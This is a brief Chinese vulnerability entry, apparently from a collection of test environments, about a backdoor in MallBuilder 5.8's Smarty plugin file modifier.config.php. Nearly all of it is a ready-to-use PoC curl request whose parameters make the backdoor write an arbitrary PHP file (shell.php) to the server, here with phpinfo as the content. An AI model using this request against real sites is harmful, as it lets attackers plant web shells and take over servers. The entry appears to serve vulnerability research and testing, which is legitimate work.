## modifier.config.php - smarty 框架后门

测试镜像

* src/mallbuilder/5.8/

参考链接

* [远丰集团旗下CMS疑有官方后门](http://www.freebuf.com/articles/web/164609.html)

Poc

```
# 请求
curl 'http://127.0.0.1/lib/smarty/plugins/modifier.config.php?codelock_filed=.&codelock_mastersize=3&codelock_act=3&codelock_enc=shell.php&codelock_masterdata=<?php+phpinfo();+?>'

# 生成
./lib/smarty/plugins/shell.php
```


